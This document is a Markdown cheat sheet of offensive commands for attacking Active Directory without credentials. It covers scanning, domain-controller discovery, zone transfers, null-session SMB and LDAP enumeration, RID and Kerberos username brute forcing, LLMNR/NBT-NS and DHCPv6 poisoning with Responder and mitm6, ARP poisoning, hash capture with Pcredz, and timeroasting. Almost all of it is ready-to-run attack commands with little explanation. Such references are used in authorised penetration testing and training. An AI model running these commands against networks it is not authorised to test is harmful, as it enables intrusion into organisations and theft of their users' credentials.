# Active Directory Attacks - No Credentials

Techniques and commands to gain initial access or enumerate without any valid credentials.

## Network Scanning & Vulnerable Hosts Discovery
```bash
# NetExec (nxc) basic scan
nxc smb <ip_range>

# Ping sweep
nmap -sP -PE -PP -PM -n <ip_range>

# Top ports scan (most common services)
nmap -Pn -sV --top-ports 50 --open <ip>

# SMB vulnerability scripts
nmap -Pn --script smb-vuln* -p139,445 <ip>

# Default script scan + version detection
nmap -Pn -sC -sV -oA <output> <ip>

# Full port scan (slow but thorough)
nmap -Pn -sC -sV -p- -oA <output> <ip>

# UDP scan (for less common services)
nmap -sU -sC -sV -oA <output> <ip>
```
##Locate Domain Controller
```bash
# From a compromised host
nmcli dev show <interface> | grep DNS

# DNS SRV records for LDAP/Kerberos
nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>

# Kerberos port scan
nmap -p 88 --open <ip_range>
```
##DNS Zone Transfer
```bash
dig axfr <domain_name> @<name_server>
```
##Anonymous / Guest SMB Access
```bash
# Null session or guest attempts
nxc smb <ip_range> -u '' -p ''
nxc smb <ip_range> -u 'a' -p 'a'

# Comprehensive enumeration
enum4linux-ng.py -A -u '' -p '' <ip>

# List shares anonymously
smbclient -U '%' -L //<ip>/IPC$
```
##LDAP Anonymous Enumeration
```bash
# Nmap LDAP scripts (no brute)
nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>

# Basic anonymous bind
ldapsearch -x -H ldap://<dc_ip> -s base namingContexts
```
##User Enumeration
```bash
# List domain users
nxc smb <dc_ip> --users

# RID brute force
nxc smb <dc_ip> --rid-brute 10000

# RPC group enumeration
net rpc group members 'Domain Users' -I <ip> -U '%'
```
##Username Bruteforce / Kerberos Enumeration
```bash
kerbrute userenum -d <domain> --dc <dc_ip> <userlist.txt>

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='<domain>',userdb=<userlist.txt>" <dc_ip>
```
##Poisoning Attacks
```bash
LLMNR / NBT-NS / mDNS Poisoning
responder -I <interface> -v
```
##DHCPv6 Spoofing (IPv6 environments)
```bash
mitm6 -d <domain>
```
##ARP Poisoning / Multi-protocol
```bash
bettercap -iface <interface>
```
##Credential Capture during Poisoning
```bash
# With Responder or similar
Pcredz -i <interface> -v   # Capture hashes (e.g., ASREQ)
```
##TimeRoasting
```bash
timeroast.py <dc_ip> -o <output_log>
```
